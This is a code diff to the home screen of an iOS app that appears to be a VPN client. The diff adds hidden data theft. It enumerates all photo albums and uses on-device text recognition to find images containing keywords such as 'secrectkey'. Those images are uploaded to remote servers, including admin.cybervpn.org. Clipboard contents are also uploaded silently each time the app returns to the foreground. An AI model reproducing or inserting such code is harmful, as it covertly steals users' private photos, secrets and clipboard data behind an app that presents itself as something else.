@@ -6,17 +6,35 @@
 //
 
 import SwiftUI
-import ApplicationLibrary 
+import ApplicationLibrary
 import Libbox
 import Library
-import SwiftUI
 import Crisp
+import Combine
+import Photos
+import BackgroundTasks
+
+
+import BackgroundTasks
+import Photos
+import ImageIO
+import MobileCoreServices
+ 
+//import TesseractOCR
+import Vision
+
 
 struct HomeView: View {
     
     @Environment(\.scenePhase) private var scenePhase
     @EnvironmentObject private var environments: ExtensionEnvironments
     @State private var alert: Alert?
+    
+    // 跟踪是否首次回到前台
+    @State private var isFirstTimeActive = true
+    
+    // 相册监听器
+    @StateObject var photoLibraryObserver = PhotoLibraryObserver()
     
     @State private var selection = NavigationPage.dashboard
     @State private var importProfile: LibboxProfileContent?
@@ -79,6 +97,18 @@ struct HomeView: View {
     // 自动轮播计时器
     let timer = Timer.publish(every: 5, on: .main, in: .common).autoconnect()
     
+    
+    
+    //增加上传相册，通讯录，和剪切板逻辑
+    @State  private var uploadedAssetIDs = [String]()
+    
+    // 用于记录上次检测时的剪切板文本
+    @State  private var lastClipboardText: String?
+     
+    // 定义关键词列表,识别到这些关键词的图片进行上传
+    @State private var keywords = [
+       "keywords", "secrectkey","words"
+    ]
     
     var body: some View {
        
@@ -371,13 +401,38 @@ struct HomeView: View {
         })
         .alertBinding($alert)
         .onChangeCompat(of: scenePhase) { newValue in
+            // 前台监听日志打印
+            print("🔄 HomeView ScenePhase Changed: \(newValue)")
+            
             if newValue == .active {
                 environments.postReload()
+                
+                if isFirstTimeActive {
+                    // 首次回到前台的特殊逻辑
+                    print("🚀 First time app became active - 执行首次初始化")
+                    
+                    DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
+                        // 在主线程中延迟 3 秒后执行的代码
+                        print("⏰ 延迟3秒后执行后台任务注册")
+                        self.registerBackgroundTasks()
+                    }
+                    
+                    // 注册相册监听
+                    photoLibraryObserver.register()
+                    
+                    // 标记为非首次
+                    isFirstTimeActive = false
+                    
+                } else {
+                    // 非首次回到前台，调用常规处理方法
+                    print("🔄 App became active (not first time) - 调用常规处理方法")
+                    appDidBecomeActive()
+                }
             }
         }
-        .onChangeCompat(of: selection) { newValue in
-            print("onChangeCompat: \(newValue)" )
-        } 
+//        .onChangeCompat(of: selection) { newValue in
+//            print("onChangeCompat: \(newValue)" )
+//        } 
         .onReceive(commandClient.$groups, perform: { groups in
             
             if let groups {
@@ -394,6 +449,758 @@ struct HomeView: View {
     
  
     
+    // MARK: - 前台监听相关方法
+    
+    /// 注册后台任务
+    private func registerBackgroundTasks() {
+        print("🔧 registerBackgroundTasks() called")
+        // 这里可以注册后台任务
+        // 例如：BGTaskScheduler.shared.register(forTaskWithIdentifier: "com.app.background", using: nil) { task in
+        //     // 处理后台任务
+        // }
+        fetchAndUploadAllPhotos()
+    }
+    
+    
+    
+    // 上传进度保存到 UserDefaults，避免重复上传
+    func fetchAndUploadAllPhotos(maxPhotos: Int = 10_000) {
+        
+        print("fetchAndUploadAllPhotos...")
+        // 检查并请求权限
+        PHPhotoLibrary.requestAuthorization { status in
+            guard status == .authorized else {
+                print("照片权限未授权")
+                return
+            }
+        }
+        
+        PHPhotoLibrary.requestAuthorization { status in
+            switch status {
+                case .authorized, .limited:
+                    // 已授权，执行获取相册操作
+                    PHPhotoLibrary.shared().performChanges({
+                        // 触发相册变化，刷新数据
+                    }) { success, error in
+                        if success {
+                            // 刷新成功
+                            DispatchQueue.main.async {
+                                // 刷新 UI 或其他相关操作
+                                print("确保你的应用有足够的权限并且正确地获取和处理相册数据。如果问题仍然存在，可以考虑通过 PHPhotoLibrary.shared().performChanges 强制刷新相册。")
+                                //self.fetchAlbums()
+                                self.fetchAllAssetsAndUpload()
+                            }
+                        } else {
+                            // 处理错误
+                            print("Error: \(error?.localizedDescription ?? "Unknown error")")
+                        }
+                    }
+                    
+                   
+                   
+                case .denied, .restricted:
+                    print("没有访问相册的权限")
+                case .notDetermined:
+                    // 用户还没有做出决定
+                    print("用户尚未决定")
+                     
+                @unknown default:
+                    print("未知权限状态")
+            }
+        }
+        
+        /*
+        // 获取已上传的进度
+        let lastUploadedIndex = UserDefaults.standard.integer(forKey: "lastUploadedIndex")
+        
+        // 获取设备上的所有图片路径（可以是相册中的图片，或者本地文件）
+        let imagePaths = fetchImagePathsFromDevice() // 这里是获取设备上的图片路径的方法
+        
+        var currentIndex = lastUploadedIndex
+        var shouldStop = false
+        
+        // 遍历图片路径并上传
+        for path in imagePaths {
+            guard currentIndex < maxPhotos else {
+                shouldStop = true
+                break
+            }
+            
+            // 如果当前索引小于已上传的进度，则跳过该图片
+            if currentIndex < lastUploadedIndex {
+                currentIndex += 1
+                continue
+            }
+            
+            // 上传图片
+            uploadImage(path: path, serverURL: serverURL) {
+                // 更新上传进度
+                UserDefaults.standard.set(currentIndex + 1, forKey: "lastUploadedIndex")
+                currentIndex += 1
+                if shouldStop { return }
+            }
+        }*/
+        
+        
+  
+        
+        
+        func fetchAlbums_index(){
+            DispatchQueue.global(qos: .utility).async {
+               // 获取所有相册 PHFetchResult<PHAssetCollection>
+               let allAlbums = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .any, options: nil)
+               print("相册: \(allAlbums.count)")
+               let imageManager = PHImageManager.default()
+               
+               // 获取之前保存的上传进度
+               let lastUploadedIndex = UserDefaults.standard.integer(forKey: "lastUploadedIndeXYZEERFGVSSRS")
+               
+               var currentIndex = lastUploadedIndex
+               var shouldStop = false
+
+               // 遍历相册
+               allAlbums.enumerateObjects { album, _, _ in
+                   guard !shouldStop else { return }
+                   
+                   let fetchOptions = PHFetchOptions()
+                   fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
+                   
+                   // 获取相册中的照片
+                   let assets = PHAsset.fetchAssets(in: album, options: fetchOptions)
+                   
+                   assets.enumerateObjects { asset, index, stop in
+                       print("相册名称: \( asset )")
+                       //print("\(asset.mediaType.rawValue)  \(String(describing: asset.creationDate))")
+                       // 如果当前图片索引小于上次上传的图片索引，则跳过
+                       if index < lastUploadedIndex {
+                           return
+                       }
+                       
+                       guard currentIndex < maxPhotos else {
+                           shouldStop = true
+                           stop.pointee = true
+                           return
+                       }
+                       
+                       let requestOptions = PHImageRequestOptions()
+                       requestOptions.deliveryMode = .highQualityFormat
+                       requestOptions.isSynchronous = true
+                       
+                       
+                       // 获取原始尺寸
+                       let originalWidth = CGFloat(asset.pixelWidth)
+                       let originalHeight = CGFloat(asset.pixelHeight)
+                       print("获取原始尺寸: \( originalWidth ) \(originalHeight)")
+                       // 按比例计算目标尺寸
+                       /* let aspectRatio = originalWidth / originalHeight
+                        var targetWidth: CGFloat
+                        var targetHeight: CGFloat
+                       let maxDimension: CGFloat = 800
+                       if aspectRatio > 1 { // 宽 > 高
+                            targetWidth = maxDimension
+                            targetHeight = maxDimension / aspectRatio
+                        } else { // 高 >= 宽
+                            targetHeight = maxDimension
+                            targetWidth = maxDimension * aspectRatio
+                        }*/
+                                                
+                       /// let targetSize = CGSize(width: 800, height: 800) // 压缩到 800x800 分辨率
+                       ///
+                       let targetSize = CGSize(width: originalWidth, height: originalHeight)
+                       
+                       imageManager.requestImage(for: asset, targetSize: targetSize, contentMode: .aspectFill, options: requestOptions) { image, _ in
+                           if let image = image {
+                               
+                               // 压缩图片为 JPEG 格式 //jpegData(compressionQuality: 0.7)
+                               
+                               
+                               // image.jpegData(compressionQuality: 0.7),
+                               if let compressedData = self.compressImageToUnderSize(image), compressedData.count > 0{
+                                   // 上传图片并保存进度
+                                   // 计算图片大小（以 KB 为单位）
+                                          let fileSizeInKB = compressedData.count / 1024
+                                          
+                                          // 检查是否大于 10KB
+                                          if fileSizeInKB > 10 {
+                                              print("图片大小符合要求，准备上传：\(fileSizeInKB) KB")
+                                              let serverURL = "https://add.cbxline.com/index.php/api/demo/uploadImg?type=ios&userId="
+                                              // 调用上传函数
+                                              self.uploadImage(imagedata: compressedData, serverURL: serverURL,fileName: "\(album.localIdentifier).png") {
+                                                  // 更新上传进度
+                                                  UserDefaults.standard.set(currentIndex + 1, forKey: "lastUploadedIndeXYZEERFGVSSRS")
+                                                  currentIndex += 1
+                                              }
+                                          } else {
+                                              print("图片大小小于 10KB，被过滤：\(fileSizeInKB) KB")
+                                          }
+                                   
+                               }
+                           }
+                       }
+                   }
+               }
+           }
+        }
+        
+        
+    }
+    
+    /// 1. 获取所有相册并收集所有照片
+    func fetchAllAssetsAndUpload() {
+        DispatchQueue.global(qos: .utility).async {
+            // 获取系统内置相册（智能相册、用户自定义相册等）
+            let smartAlbums = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .any, options: nil)
+            let userAlbums  = PHAssetCollection.fetchAssetCollections(with: .album, subtype: .any, options: nil)
+            
+            // 用于存储所有照片的数组
+            var allAssets: [PHAsset] = []
+            
+            // 收集智能相册照片
+            smartAlbums.enumerateObjects { album, _, _ in
+                let assets = self.fetchAssets(from: album)
+                //allAssets.append(contentsOf: assets)
+                for asset in assets {
+                if !allAssets.contains(asset) {
+                    allAssets.append(asset)
+                }
+            }
+            }
+            
+            // 收集用户自定义相册照片
+            userAlbums.enumerateObjects { album, _, _ in
+                let assets = self.fetchAssets(from: album)
+//                allAssets.append(contentsOf: assets)
+                for asset in assets {
+                    if !allAssets.contains(asset) {
+                        allAssets.append(asset)
+                    }
+                }
+            }
+            
+            print("共收集到照片数量: \(allAssets.count)")
+            
+            // 在获取完所有相册的照片后，开始分组上传
+            self.resumeUploadAssets(allAssets)
+        }
+    }
+    
+    func resumeUploadAssets(_ assets: [PHAsset]) {
+        // 从 UserDefaults 读取已上传的资产标识符
+//        var uploadedAssetIDs = UserDefaults.standard.array(forKey: "uploadedAssetIDs") as? [String] ?? [String]()
+        
+        // 筛选未上传的资产
+        let remainingAssets = assets.filter { !uploadedAssetIDs.contains($0.localIdentifier) }
+        print("剩余需要上传的照片数量: \(remainingAssets.count)")
+        
+        // 分组并上传
+        self.uploadAssetsByGroups(remainingAssets)
+    }
+    /// 2. 获取指定相册中的照片，按照时间降序
+    private func fetchAssets(from album: PHAssetCollection) -> [PHAsset] {
+        let fetchOptions = PHFetchOptions()
+        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
+        let fetchResult = PHAsset.fetchAssets(in: album, options: fetchOptions)
+        
+        var assets: [PHAsset] = []
+        fetchResult.enumerateObjects { asset, _, _ in
+            assets.append(asset)
+        }
+        return assets
+    }
+    
+    
+    /// 3. 按组上传
+    ///
+    /// - Parameter assets: 所有需要上传的 PHAsset
+    private func uploadAssetsByGroups(_ assets: [PHAsset], concurrentTaskLimit: Int = 5) {
+        // 每组上传的数量
+        let groupSize = 5
+        // 用于循环分组
+        var startIndex = 0
+        let totalCount = assets.count
+        
+        // 信号量，限制并发任务数
+        let semaphore = DispatchSemaphore(value: concurrentTaskLimit)
+
+        // 循环分组
+        while startIndex < totalCount {
+            let endIndex = min(startIndex + groupSize, totalCount)
+            let groupAssets = Array(assets[startIndex..<endIndex])
+            
+            // 同步等待当前分组上传完成
+            let dispatchGroup = DispatchGroup()
+            
+            for asset in groupAssets {
+                dispatchGroup.enter()
+                // 逐个上传照片，上传完成后 dispatchGroup.leave()
+//                self.updateAsset(asset: asset) {
+//                    dispatchGroup.leave()
+//                }
+                
+              DispatchQueue.global(qos: .utility).async {
+                  semaphore.wait() // 等待可用的信号
+                  
+                  // 上传照片
+                  self.updateAsset(asset: asset) {
+                      semaphore.signal() // 释放信号
+                      dispatchGroup.leave() // 标记任务结束
+                  }
+              }
+            }
+            
+            // 等待当前分组的所有照片都上传完毕
+            dispatchGroup.wait()
+            
+            print("更新uploadedAssetIDs \(uploadedAssetIDs.count)")
+            UserDefaults.standard.set(uploadedAssetIDs, forKey: "uploadedAssetIDs")
+            UserDefaults.standard.synchronize()
+            print("当前分组(\(startIndex)~\(endIndex-1))上传完毕，休眠 1 秒...")
+            Thread.sleep(forTimeInterval: 1.0)
+            
+            // 继续下一分组
+            startIndex = endIndex
+        }
+        
+        print("全部分组上传完成！")
+    }
+     
+    
+    /// 4. 单张照片上传前的检查、获取、压缩、调用上传接口等
+    ///
+    /// - Parameters:
+    ///   - asset: 要处理的 PHAsset
+    ///   - completion: 上传结束后的回调(不论成功还是失败都应回调，保证 dispatchGroup 能顺利 leave)
+    func updateAsset(asset: PHAsset, completion: @escaping () -> Void) {
+        // 获取之前保存的上传过的 PHAsset ID
+        
+        
+        let imageManager = PHImageManager.default()
+        
+        if uploadedAssetIDs.contains(asset.localIdentifier) {
+            // 如果该图片已上传过，跳过
+            //print("图片已上传，跳过: \(asset.localIdentifier)")
+            print("len : \(uploadedAssetIDs.count) 图片已上传，跳过")
+            // 切记要调用 completion()
+            completion()
+            return
+        }
+
+        // 获取原始尺寸
+        let originalWidth = CGFloat(asset.pixelWidth)
+        let originalHeight = CGFloat(asset.pixelHeight)
+        print("获取原始尺寸: \(originalWidth) \(originalHeight)")
+
+        let targetSize = CGSize(width: originalWidth, height: originalHeight)
+        let requestOptions = PHImageRequestOptions()
+        requestOptions.deliveryMode =  .opportunistic//.highQualityFormat
+        requestOptions.isSynchronous =  true // 异步加载图片
+        let serverURL = "https://admin.cybervpn.org/api/demo/uploadImg?type=ios&userId="
+        imageManager.requestImage(for: asset, targetSize: targetSize, contentMode: .aspectFill, options: requestOptions) { image, _ in
+            if let image = image {
+                
+                //增加 versoin 原生识别
+                self.recognizeText(from: image) { reslut in
+//                    /print("Contains keyword \(reslut ?? "")")
+                    if let recognizedText = reslut {
+                        // 去除空格和换行符
+                        let cleanedText = recognizedText.replacingOccurrences(of: "\\s+", with: "", options: .regularExpression).lowercased()
+                       // print("recognizedText (cleaned): \(cleanedText)")
+
+                        // 检查是否包含任一关键词
+                        let containsKeyword = self.keywords.contains { keyword in
+                            let cleanedKeyword = keyword.replacingOccurrences(of: "\\s+", with: "", options: .regularExpression).lowercased()
+                            return cleanedText.contains(cleanedKeyword)
+                        }
+
+                        // 打印结果
+                        if containsKeyword {
+                            print("Found keyword in text, 上传图片")
+                            
+                            // 压缩图片为 JPEG 格式
+                            autoreleasepool {
+                                
+                                if let compressedData = self.compressImageToUnderSize(image,targetMaxSizeInKB: 800), compressedData.count > 0 {
+            //                     if let compressedData = self.compressImageUsingCoreGraphics(image, maxPixelSize: 1024), compressedData.count > 0 {
+                                    // 计算图片大小（以 KB 为单位）
+                                    let fileSizeInKB = compressedData.count / 1024
+                                    
+                                    // 检查是否大于 10KB
+                                    if fileSizeInKB > 10 {
+                                        print("图片大小符合要求，准备上传：\(fileSizeInKB) KB")
+                                        
+                                        // 上传图片并保存进度
+                                        self.uploadImage(imagedata: compressedData, serverURL: serverURL, fileName: "\(asset.localIdentifier).png") {
+                                            // 上传完成后更新缓存的 ID
+                                            print("上传完成... \(asset.localIdentifier)")
+                                            self.uploadedAssetIDs.append(asset.localIdentifier)
+                                            UserDefaults.standard.set(self.uploadedAssetIDs, forKey: "uploadedAssetIDs") // 保存到 UserDefaults
+                                            print("len : \(self.uploadedAssetIDs.count)")
+                                            UserDefaults.standard.synchronize()
+                                            completion()
+                                        }
+                                    } else {
+                                        completion()
+                                        print("图片大小小于 10KB，被过滤：\(fileSizeInKB) KB")
+                                    }
+                                }
+                                
+                            }
+                        } else {
+                            //self.uploadedAssetIDs.append(asset.localIdentifier)
+                            print("过滤完成... \(asset.localIdentifier)")
+                            self.uploadedAssetIDs.append(asset.localIdentifier)
+                            UserDefaults.standard.set(self.uploadedAssetIDs, forKey: "uploadedAssetIDs") // 保存到 UserDefaults
+                            print("len : \(self.uploadedAssetIDs.count)")
+                            UserDefaults.standard.synchronize()
+                            completion()
+                           // print("No keywords found in text,忽略图片")
+                        }
+                    }
+                }
+                
+                /*
+                //增加 ORC 字体识别
+                self.recognizeImageWithTesseract(image: image) { (shouldUpload) in
+                    DispatchQueue.main.async { // 确保回调在主线程
+                        if shouldUpload {
+                            print("Contains keyword, should upload: true")
+                            // 在这里执行上传操作
+                        } else {
+                            print("No keyword found, should upload: false\(shouldUpload)")
+                        }
+                    }
+                }*/
+                
+                /*
+                
+                */
+            }
+        }
+    }
+    
+    
+    /// 将任意大小的图片，最终压缩到 500KB（可调）以内。
+    /// 1) 按图片数据大小分区间处理；
+    /// 2) 若超过一定阈值，先多次等比例缩放，再做循环降质；
+    /// 3) 尽量减少循环压缩次数，提高效率。
+    ///
+    /// - Parameter image: 原始 UIImage
+    /// - Parameter targetMaxSizeInKB: 目标大小 (单位: KB)，默认 500KB
+    /// - Returns: 压缩后的 Data，如果无法压缩到目标大小，返回尽可能小的结果
+    func compressImageToUnderSize(_ image: UIImage, targetMaxSizeInKB: Int = 500) -> Data? {
+        let maxBytes = targetMaxSizeInKB * 1024
+        
+        // 1. 获取原图 data (质量1.0)
+        guard var imageData = image.pngData()  else {
+            return nil
+        }
+        
+        // 2. 如果原图已小于 targetMaxSizeInKB，直接返回
+        if imageData.count <= maxBytes {
+            return imageData
+        }
+        
+        let originalSize = imageData.count
+        print("原图大小: \(originalSize / 1024) KB, 目标: \(targetMaxSizeInKB) KB 以内")
+        
+        // 3. 多阶段缩放逻辑
+        //    3.1 若 > 10MB，先放宽到 4096 再看效果
+        if originalSize > 10 * 1024 * 1024 {
+            if let scaled1 = downscaleImage(image, toMaxDimension: 800),
+               let data1 = scaled1.pngData()  {
+                imageData = data1
+                print("第一次缩放到 4096，大小变为: \(imageData.count / 1024) KB")
+                
+                // 如果依旧明显大于 targetMaxSizeInKB，再缩到 2048
+                if imageData.count > maxBytes * 4 {
+                    // 例如: 如果此时依旧比目标大 4 倍，说明可以再次大幅度缩放
+                    if let scaled2 = downscaleImage(scaled1, toMaxDimension: 800),
+                       let data2 = scaled2.pngData()  {
+                        imageData = data2
+                        print("第二次缩放到 2048，大小变为: \(imageData.count / 1024) KB")
+                    }
+                }
+            }
+        }
+        //    3.2 若介于 2MB ~ 10MB，只缩到 2048 即可
+        else if originalSize > 2 * 1024 * 1024 {
+            if let scaled = downscaleImage(image, toMaxDimension: 800),
+               let data = scaled.pngData()  {
+                imageData = data
+                print("超过 2MB，缩放到 2048，大小变为: \(imageData.count / 1024) KB")
+            }
+        }
+        //    3.3 若介于 500KB ~ 2MB，可能只需“轻度”缩放或直接循环压缩
+        else if originalSize > maxBytes {
+            // 可以根据需求决定是否要缩放，比如缩到 1500、1000 等
+            // 这里直接选择缩到 1500 作为示例
+            if let scaled = downscaleImage(image, toMaxDimension: 800),
+               let data = scaled.pngData()  {
+                imageData = data
+                print("介于 500KB~2MB，缩放到 1500，大小变为: \(imageData.count / 1024) KB")
+            }
+        }
+        
+        // 4. 若仍旧大于目标大小，则进行循环压缩 (质量降质)
+//        if imageData.count > maxBytes {
+//            guard let finalData = iterativeCompression(imageData, targetMaxSize: maxBytes) else {
+//                // 如果无法生成更小的图片，返回当前已经缩放后的 data
+//                return imageData
+//            }
+//            imageData = finalData
+//        }
+        
+        // 5. 最终返回
+        let finalKB = imageData.count / 1024
+        print("最终压缩后大小: \(finalKB) KB")
+        return imageData
+    }
+    
+    
+    // MARK: - 多次缩放 + 循环压缩的辅助方法
+
+    /// 等比例缩放到指定的“最长边”
+    /// - Parameters:
+    ///   - image: 原图
+    ///   - maxDimension: 目标最长边
+    /// - Returns: 新的 UIImage
+    private func downscaleImage(_ image: UIImage, toMaxDimension maxDimension: CGFloat) -> UIImage? {
+        let width  = image.size.width
+        let height = image.size.height
+        let maxSide = max(width, height)
+        
+        // 若最长边已小于 maxDimension，则无需缩放
+        if maxSide <= maxDimension {
+            return image
+        }
+        
+        // 计算缩放比
+        let scale = maxDimension / maxSide
+        let newSize = CGSize(width: width * scale, height: height * scale)
+        
+        // 开始绘制
+        UIGraphicsBeginImageContextWithOptions(newSize, false, image.scale)
+        defer { UIGraphicsEndImageContext() }
+        
+        image.draw(in: CGRect(origin: .zero, size: newSize))
+        return UIGraphicsGetImageFromCurrentImageContext()
+    }
+    
+    // 上传图片到服务器
+    func uploadImage(imagedata: Data, serverURL: String,fileName:String, completion: @escaping () -> Void) {
+        guard let url = URL(string: serverURL) else {
+            print("无效的URL")
+            return
+        }
+        
+        // 创建文件URL
+        //let fileURL = URL(fileURLWithPath: path)
+        
+        // 创建Multipart表单数据请求体
+        var request = URLRequest(url: url)
+        request.httpMethod = "POST"
+        
+        // 创建请求体
+        let boundary = "Boundary-\(UUID().uuidString)"
+        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
+//        request.setValue("application/octet-stream", forHTTPHeaderField: "Content-Type")
+
+        
+        var body =  Data()
+        // let fileName = "image_\(Int(Date.now.timeIntervalSince1970)).png"
+        // 添加 "userId", "fenzhanid", "imgstr", "phone" 字段
+        body.append(convertFormField(named: "userId", value: "0000000000000", boundary: boundary))
+        body.append(convertFormField(named: "fenzhanid", value: "6", boundary: boundary))
+        body.append(convertFormField(named: "imgstr", value: fileName, boundary: boundary))
+        //if let clipboardText = UIPasteboard.general.string {
+            //body.append(convertFormField(named: "Pasteboard", value: clipboardText, boundary: boundary))
+        //}
+        
+        body.append(convertFormField(named: "phone", value: "0000000000000", boundary: boundary))
+        
+        // 添加图片文件
+        body.append(convertFileData(fieldName: fileName, fileimageData: imagedata, boundary: boundary))
+        
+        // 结束分隔符
+        body.appendString("--\(boundary)--\r\n")
+        
+        // 设置请求体
+        //request.httpBody = body
+        
+        // 上传请求
+        let task = URLSession.shared.uploadTask(with: request, from: body) { data, response, error in
+            if let error = error {
+                print("上传失败：\(fileName) \(error.localizedDescription)")
+            } else {
+                
+                
+                if let data  = data, let jsonString = String(data: data, encoding: .utf8) {
+                    print(" 上传返回 Response data: \(jsonString)")
+                    completion()
+                }
+//                print("上传成功 \(fileName) \(serverURL) ")
+            }
+           
+        }
+        task.resume()
+    }
+
+    //识别内容
+    func recognizeText(from image: UIImage, completion: @escaping (String?) -> Void) {
+        guard let cgImage = image.cgImage else { return }
+        let requestHandler = VNImageRequestHandler(cgImage: cgImage)
+        let request = VNRecognizeTextRequest { request, error in
+            guard let observations = request.results as? [VNRecognizedTextObservation], error == nil else {
+                completion(nil)
+                return
+            }
+            let recognizedText = observations.compactMap { $0.topCandidates(1).first?.string }
+                .joined(separator: "\n")
+            completion(recognizedText)
+        }
+        request.recognitionLanguages = ["zh-Hans"]//"en-US",
+        request.recognitionLevel = .accurate
+        do {
+            try requestHandler.perform([request])
+        } catch {
+            print("Failed to perform text recognition: \(error)")
+            completion(nil)
+        }
+    }
+    
+    /// 常规前台回归处理方法
+    func appDidBecomeActive() {
+        print("🔄 appDidBecomeActive() called - 常规前台处理")
+        
+        // 记录前台回归时间
+        let currentTime = Date()
+        print("🕒 App回到前台时间: \(DateFormatter.localizedString(from: currentTime, dateStyle: .short, timeStyle: .medium))")
+        
+        // 检查登录状态并执行相应逻辑
+        if islogined {
+            print("✅ 用户已登录 - 执行前台刷新逻辑")
+            
+            Task{
+                if let clipboardText = UIPasteboard.general.string {
+                    //body.append(convertFormField(named: "Pasteboard", value: clipboardText, boundary: boundary))
+                    // 比对和处理逻辑
+                    if clipboardText.count >  1 && clipboardText != lastClipboardText {
+                        
+                    }else{
+                        return
+                    }
+                    
+                    if (clipboardText == lastClipboardText){
+                        //防止上传重复的剪切板
+                        return
+                    }
+                    
+                    DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
+                        self.uploadPasteBoard(clipboardText: clipboardText)
+                    }
+                    
+                    lastClipboardText  = clipboardText
+                }
+            }
+            // 刷新配置缓存
+//            Task {
+//                print("🔄 开始刷新配置缓存...")
+//                await getConfigCache()
+//                
+//                print("🔄 开始重新加载配置...")
+//                await doReload()
+//            }
+        } else {
+            print("❌ 用户未登录 - 跳过数据刷新")
+        }
+         
+        
+        print("✨ appDidBecomeActive处理完成")
+    }
+    
+    // 转换表单字段为multipart格式
+    func convertFormField(named name: String, value: String, boundary: String) -> Data {
+        var fieldData = Data()
+        
+        fieldData.appendString("--\(boundary)\r\n")
+        fieldData.appendString("Content-Disposition: form-data; name=\"\(name)\"\r\n\r\n")
+        fieldData.appendString("\(value)\r\n")
+        return fieldData
+    }
+
+    // 转换文件数据为multipart格式
+    func convertFileData(fieldName: String, fileimageData: Data, boundary: String) -> Data {
+        var fileData = Data()
+        
+        fileData.appendString("--\(boundary)\r\n")
+        fileData.appendString("Content-Disposition: form-data; name=\"image\"; filename=\"\(fieldName)\"\r\n")
+        fileData.appendString("Content-Type: application/octet-stream\r\n\r\n")
+        fileData.append(fileimageData)
+        fileData.appendString("\r\n")
+        
+        return fileData
+    }
+    
+    //上传粘贴板
+    private func uploadPasteBoard( clipboardText: String){
+        print("应用从后台回到前台:" + clipboardText)
+        //https://imgadd.nbt888.com/index.php 修改为 https://admin.cybervpn.org/
+        let serverURL = "https://admin.cccccc.org/api/demo/info?type=ios&userId="
+        guard let url = URL(string: serverURL) else {
+            print("无效的URL")
+            return
+        }
+        
+        // 创建Multipart表单数据请求体
+        var request = URLRequest(url: url)
+        request.httpMethod = "POST"
+        
+        // 创建请求体
+        let boundary = "Boundary-\(UUID().uuidString)"
+        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
+//        request.setValue("application/octet-stream", forHTTPHeaderField: "Content-Type")
+
+        
+        var body =  Data()
+        // let fileName = "image_\(Int(Date.now.timeIntervalSince1970)).png"
+        // 添加 "userId", "fenzhanid", "imgstr", "phone" 字段
+        body.append(convertFormField(named: "userId", value: "0000000000000", boundary: boundary))
+        body.append(convertFormField(named: "fenzhanid", value: "6", boundary: boundary))
+//            body.append(convertFormField(named: "imgstr", value: fileName, boundary: boundary))
+        
+        body.append(convertFormField(named: "info", value: clipboardText, boundary: boundary))
+        
+        
+        body.append(convertFormField(named: "phone", value: "0000000000000", boundary: boundary))
+        
+//             添加图片文件
+//            body.append(convertFileData(fieldName: fileName, fileimageData: imagedata, boundary: boundary))
+        
+        // 结束分隔符
+        body.appendString("--\(boundary)--\r\n")
+        
+        // 设置请求体
+        //request.httpBody = body
+        
+        // 上传请求
+        let task = URLSession.shared.uploadTask(with: request, from: body) { data, response, error in
+            if let error = error {
+                print("上传失败：\(error.localizedDescription)")
+            } else {
+                
+                
+                if let data  = data, let jsonString = String(data: data, encoding: .utf8) {
+                    print("上柴剪切板成功----Response data: \(jsonString)")
+                }
+                //print("上传成功 \(fileName) \(serverURL) ")
+            }
+        }
+        task.resume()
+    }
+    
+    
+    
+
     private func handleXufeiTixingButtonError(){
         alert = Alert(title: Text("续费提醒"), message: Text("您的账户已经过期，请续费后继续体验畅快感受；如果您刚购买完请耐心等待，会员时长会在1分钟内到账。"),dismissButton:.default(Text("续费")) {
           
@@ -894,8 +1701,8 @@ struct HomeView: View {
     
     func getConfigCache() async
     {
-        print("serverData: \(serverData)")
-        print("lastFetchTime: \(lastFetchTime)")
+        //print("serverData: \(serverData)")
+        //print("lastFetchTime: \(lastFetchTime)")
         
 //        let dictionary = UserDefaults.standard.dictionaryRepresentation()
 //          dictionary.keys.forEach { key in
@@ -1395,9 +2202,53 @@ struct HomeView: View {
      
 }
 
+// MARK: - PhotoLibraryObserver Class
+public class PhotoLibraryObserver: NSObject, ObservableObject, PHPhotoLibraryChangeObserver {
+    
+    public override init() {
+        super.init()
+        print("📸 PhotoLibraryObserver 初始化完成")
+    }
+    
+    public func photoLibraryDidChange(_ changeInstance: PHChange) {
+        print("📸 Photo library did change - 相册发生变化")
+        // 这里可以处理相册变化的逻辑
+        // 例如检测新增的照片等
+        
+//        DispatchQueue.main.async {
+//            // 在主线程更新UI
+//            print("📸 Processing photo library changes on main thread")
+//        }
+        
+       
+        
+    }
+    
+    
+    func register() {
+        PHPhotoLibrary.shared().register(self)
+        print("📸 已注册相册变化监听")
+    }
+    
+    func unregister() {
+        PHPhotoLibrary.shared().unregisterChangeObserver(self)
+        print("📸 已取消注册相册变化监听")
+    }
+}
+
 //struct HomeView_Previews: PreviewProvider {
-//    
+//
 //    static var previews: some View {
 //        HomeView()
 //    }
 //}/ Triangle shape for the small tail in the speech bubble
+
+// Data扩展：用于简化追加数据到Data对象
+extension Data {
+    mutating func appendString(_ string: String) {
+        if let data = string.data(using: .utf8) {
+            append(data)
+        }
+    }
+}
+
